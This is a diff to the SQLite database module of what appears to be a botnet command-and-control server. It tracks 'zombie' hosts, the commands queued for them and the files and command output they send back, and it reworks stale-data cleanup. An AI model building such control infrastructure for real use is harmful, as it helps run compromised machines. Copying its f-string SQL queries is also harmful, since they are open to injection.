@@ -5,6 +5,7 @@ import datetime
 import secrets
 import base64
 import logging
+from pathlib import Path
 
 logger = logging.getLogger("database")
 logging.basicConfig(level=logging.DEBUG, handlers=[
@@ -16,7 +17,7 @@ logging.basicConfig(level=logging.DEBUG, handlers=[
 """
     Table Structures:
         - zombies
-            - zombieID (incrementing integer)
+            - zombieID 
             - state (enum {"CheckedIn", "CommandSet", "CommandRecieved", "Stale"})
             - hostInfo (json body with some info about host)
             - lastCheckIn (timestamp of last seen))
@@ -51,17 +52,17 @@ class Database:
         ALT: gen_token = lambda: secrets.token_urlsafe(32)
     """
     def get_token(self):
-        token = secrets.token_urlsafe(32)
-        return token
+        return secrets.token_urlsafe(32)
      
-    name = ""
-    path = ""
+    # name = ""
+    # path = ""
     
     """
     - Set up database variables from OS envvars.
     """
     def __init__(self, path="./",name="database.db"):
         try:
+            self.server_path = Path(os.environ['base_path'])
             try:
                 if os.environ['db_path']:
                     self.path = os.environ['db_path']
@@ -81,6 +82,7 @@ class Database:
         except:
             logger.info("Error configuring database from envvars, defaulting")
             self.name = "database.db"
+            self.path = path
             return
 
     """
@@ -629,15 +631,16 @@ class Database:
             zombies = res.fetchall()
             #logger.debug(f"Zombies: {zombies}")
             for zombieID, lastChkin in zombies:
-                logger.debug(f"zombie: {zombieID}, laskChkin: {lastChkin}")
+                logger.debug(f"zombie: Id {zombieID} last checked in {lastChkin}")
                 expire = self.add_x(1,lastChkin)
                 is_expired = self.comp_time(now, expire)
-                logger.debug(f"zombieID: {zombieID}, is_expired: {is_expired}, expire: {expire}, now: {now}")
+                logger.debug(f"zombie: ID: {zombieID}, is_expired: {is_expired}, expire time: {expire}, now: {now}")
                 if(is_expired):
-                    logger.debug(f"SCRUB_TABLE => Found zombie {zombieID} is expired, DELETING!")
+                    logger.debug(f"zombie: Found zombie {zombieID} is expired, DELETING!")
                     cmd = f"delete from zombies where zombieID='{zombieID}'"
                     cur.execute(cmd)
                     con.commit()
+                    logger.debug(f"zombie {zombieID} should no longer be in database")
                     continue
                 else:
                     logger.debug(f"SCRUB_TABLE: Zombie {zombieID} is still valid.")
@@ -649,7 +652,7 @@ class Database:
             cmd = "select zombieID from zombies"
             res = cur.execute(cmd)
             active = res.fetchall()
-            #logger.debug(f"Found Zombies: {active}")
+            logger.debug(f"commands: Found active zombies {active}")
             cmd = "select zombieID from commands"
             res = cur.execute(cmd)
             to_check = res.fetchall()
@@ -657,7 +660,7 @@ class Database:
             for zombie in to_check:
                 if zombie not in active:
                     to_rmv.append(zombie)
-            #logger.debug(f"Zombies to remove: {to_rmv}")
+            logger.debug(f"commands: Zombies to remove: {to_rmv}")
             for zombie in to_rmv:
                 #print(f"[???] in FOR LOOP -> FOUND ZOMBIE {zombie[0]}")
                 cmd = f"delete from commands where zombieID='{zombie[0]}'"
@@ -672,35 +675,91 @@ class Database:
             cmd = "select zombieID from zombies"
             res = cur.execute(cmd)
             active = res.fetchall()
-            #print(f"SCRUB_TABLE => 'data': Found Zombies: {active}")
+            logger.debug(f"data: Found active zombies: {active}")
             cmd = "select zombieID from data"
             res = cur.execute(cmd)
             to_check = res.fetchall()
+            logger.debug(f"data: found zombies with data: {to_check}")
             to_rmv = []
             for zombie in to_check:
                 if zombie not in active:
-                    to_rmv.append(zombie)
-            #print(f"SCRUB_TABLE => 'data': Zombies to remove: {to_rmv}")
+                    to_rmv.append(zombie[0])
+            to_rmv = list(dict.fromkeys(to_rmv))
+            logger.debug(f"data: Zombies to remove: {to_rmv}")
             # first dump the data to disk './files/stale/<zombieID>-<Token>
             # then remove from database
             for zombie in to_rmv:
-                #print(f"SCRUB_TABLE => 'data': zombieID to process {zombie[0]}")
-                cmd = f"select zombieID, token, dataBlob from data where zombieID='{zombie[0]}'"
+                print(f"data: zombieID to process {zombie}")
+                cmd = f"select zombieID, token, dataBlob from data where zombieID='{zombie}'"
                 res = cur.execute(cmd)
                 results =  res.fetchall()
                 #save data to disk
-                for z, t, d in results:
-                    filename = f"{z}={t}"
-                    path = f"./files/stale/{filename}"
-                    logger.debug(f"now attempting to save data to {path}")
-                    with open(path, 'w') as f:
-                        f.write(d)
-                        f.close()
-                #delete database entry
-                logger.debug(f"now deleting zombieID from table: {zombie[0]}")
-                cmd = f"delete from data where zombieID='{zombie[0]}'"
-                cur.execute(cmd)
-                con.commit()
+                logger.debug(f"all results from zombie to remove: {results}")
+                zombie_home = self.server_path / "files" / "zombies" / zombie
+                dest_path = self.server_path / "files" / "stale" / zombie
+                for z, t, d in results: # FIX ME!!! 
+                    # Below is failing, causing data to accumulate.
+                    # 1 All post files will stay, need to extract any data blobs to disk.
+                    # 2 ensure that we pull all files from post into stale first.
+                    # 3 copy of pre files into stale/zombieID/pre/
+                    # 4 remove all of zombie homedir
+                    # 5 Update server to have way to repull stale files
+                    logger.debug(f"data: token is |{t}|, zombie is |{z}|, data is |{d}|")
+                    try:
+                        source_file = zombie_home / "post" / t
+                        dest_file = dest_path / t
+                    except Exception as e:
+                        logger.error(f"data: Couldn't configure paths due to: {e}")
+                    # first check if path exists
+                    try:
+                        if not dest_path.exists():
+                            try:
+                                dest_path.mkdir(parents=True, exist_ok=True)
+                            except Exception as e:
+                                logger.debug(f"couldn't create path {dest_path} for reason: {e}")
+                    except Exception as e:
+                        logger.debug(f"data: couldn't check if dir exists due to: {e}")
+                    try:
+                        if d[:4].upper() == "FILE":
+                            # if blob is a file
+                            logger.debug(f"data: Found that blob is file")
+                            if not dest_path.exists():
+                                try:
+                                    dest_path.mkdir(parents=True, exist_ok=True)
+                                except Exception as e:
+                                    logger.debug(f"couldn't create path {dest_path} for reason: {e}")
+                            logger.debug(f"Now moving file {source_file} to dest {dest_file}")
+                            source_file.rename(dest_file) # this moves the file to the new location
+                            #assert not source_file.exists()
+                        else:
+                            # blob is command output, should store to binary file
+                            logger.debug("Found that blob is command")
+                            try:
+                                with open(dest_file, 'wb') as f:
+                                    f.write(d.encode('utf-8'))
+                                    f.close()
+                                    logger.debug(f"Wrote file {dest_file} to disk!")
+                            except Exception as e:
+                                logger.error(f"data: Couldn't write {dest_file} due to {e}")
+                    except Exception as e:
+                        logger.debug(f"Couldn't determine if data was file or chunk due to {e}")
+                    # Now that the data is handled, lets remove it from db
+                    logger.debug("Now attempting to remove data from db")
+                    try:
+                        cmd = f"delete from data where token='{t}'"
+                        logger.debug(f"cmd to run: {cmd}")
+                        res = cur.execute(cmd)
+                        results = res.fetchall()
+                        logger.debug(f"Results:{results}")
+                        con.commit()
+                        logger.debug(f"token {t} should no longer exist")
+                    except Exception as e:
+                        logger.debug(f"data: Couldn't remove token from db due to: {e}")
+
+                # All data from zombie should be saved, next delete home dir
+                from shutil import rmtree
+                rmtree(zombie_home, ignore_errors=True)
+                logger.debug(f"{zombie} homedir deleted")
         else:
             logger.debug(f"{table} not valid option")
             return
